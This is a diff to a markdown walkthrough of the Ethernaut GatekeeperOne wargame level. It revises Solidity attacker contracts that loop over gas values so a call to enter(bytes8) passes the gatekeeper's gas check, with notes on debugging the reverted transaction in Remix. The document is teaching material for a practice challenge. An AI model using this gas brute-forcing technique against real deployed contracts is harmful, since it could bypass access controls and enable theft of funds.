@@ -127,15 +127,12 @@ This is for sure the most difficult part to crack. It is highly recommended to u
     }
 
     contract GateSneakOne {
-        function callEnter(bytes8 _key, address _gateKeeperAddr, uint256 _offset, uint256 _initialGas) public returns(bool){
-            for (uint256 i = 0; i < _offset; i++) {
-            (bool success, ) = _gateKeeperAddr.call{gas: (i + _initialGas + 8191 * 4)}(abi.encodeWithSignature("enter(bytes8)", _key));
-            if(success){
-                break;
-            }
+
+        function callEnter(bytes8 _key, address _gateKeeperAddr) public returns(bool){
+            (bool success, ) = _gateKeeperAddr.call(abi.encodeWithSignature("enter(bytes8)", _key));
         }
-    }  
-    
+
+    }   
 ```
 
 The idea is to first deploy the ```GatekeeperOne``` then ```GateSneakOne``` and after that, having the ```GatekeeperOne``` address make the ```callEnter``` call. The key can be any bytes8 date because this excecution will revert before checking that key. With the reversal, you can check that on Remix transactions feed there is a ```debug``` button next to the reverted tx. Let's debug it. 
@@ -156,13 +153,13 @@ To get the amount of gas we just need to: ```8191 * Margin + Consumed Gas``` wil
 
     contract Caller {
 
-        function callEnter(bytes8 _key, address _gateKeeper, uint256 _offset, uint256 _initialGas) public returns(bool){
+        function callEnter(bytes8 _key, address _gateKeeperAddr, uint256 _offset, uint256 _initialGas) public returns(bool){
             for (uint256 i = 0; i < _offset; i++) {
-                if (_gateKeeper.call.gas(i + _initialGas + 8191 * 5)(bytes4(keccak256("enter(bytes8)")), _key)) {
-                    return true;
-                }
+            (bool success, ) = _gateKeeperAddr.call{gas: (i + _initialGas + 8191 * 4)}(abi.encodeWithSignature("enter(bytes8)", _key));
+            if(success){
+                break;
             }
-        }        
+        }     
     }
 ```
 
